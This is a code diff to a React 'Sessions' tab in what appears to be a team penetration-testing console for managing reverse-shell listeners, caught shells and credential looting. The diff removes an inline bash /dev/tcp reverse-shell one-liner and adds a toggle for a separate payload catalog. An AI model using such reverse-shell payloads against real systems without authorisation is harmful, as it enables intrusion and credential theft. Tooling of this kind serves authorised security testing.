@@ -2,6 +2,7 @@ import { useEffect, useState } from "react";
 import { SessionInfo, ListenerInfo, getSessions, getListeners, startListener, stopListener,
   lootCred, getTranscript } from "./api";
 import { ShellTerminal } from "./Terminal";
+import { PayloadCatalog } from "./Payloads";
 
 // The Sessions tab: open listeners, watch caught shells land (grouped by host), and drive
 // them collaboratively. The whole team sees the same list on the one shared server.
@@ -11,6 +12,7 @@ export function Sessions({ tester, focus }: { tester: string; focus?: string | n
   const [open, setOpen] = useState<string | null>(null);
   const [port, setPort] = useState("4444");
   const [err, setErr] = useState<string | null>(null);
+  const [payloadsFor, setPayloadsFor] = useState<string | null>(null);
 
   // open a specific session when jumped here from the host drawer
   useEffect(() => { if (focus) setOpen(focus); }, [focus]);
@@ -38,7 +40,6 @@ export function Sessions({ tester, focus }: { tester: string; focus?: string | n
     }
   }
 
-  const lhost = location.hostname;
   const openSession = sessions.find((s) => s.id === open) || null;
 
   return (
@@ -57,11 +58,16 @@ export function Sessions({ tester, focus }: { tester: string; focus?: string | n
         <div className="listener-list">
           {listeners.length === 0 && <div className="muted">no listeners yet</div>}
           {listeners.map((l) => (
-            <div key={l.id} className="listener-item">
-              <span className="mono">:{l.port}</span>
-              <span className="badge">{l.kind}</span>
-              <code className="payload">bash -i &gt;&amp; /dev/tcp/{lhost}/{l.port} 0&gt;&amp;1</code>
-              <button className="linkish" onClick={() => { stopListener(l.id).then(refresh); }}>stop</button>
+            <div key={l.id} className="listener-block">
+              <div className="listener-item">
+                <span className="mono">:{l.port}</span>
+                <span className="badge">{l.kind}</span>
+                <button className="linkish" onClick={() => setPayloadsFor(payloadsFor === l.id ? null : l.id)}>
+                  {payloadsFor === l.id ? "hide payloads" : "payloads ▾"}
+                </button>
+                <button className="linkish" onClick={() => { stopListener(l.id).then(refresh); }}>stop</button>
+              </div>
+              {payloadsFor === l.id && <PayloadCatalog port={l.port} />}
             </div>
           ))}
         </div>
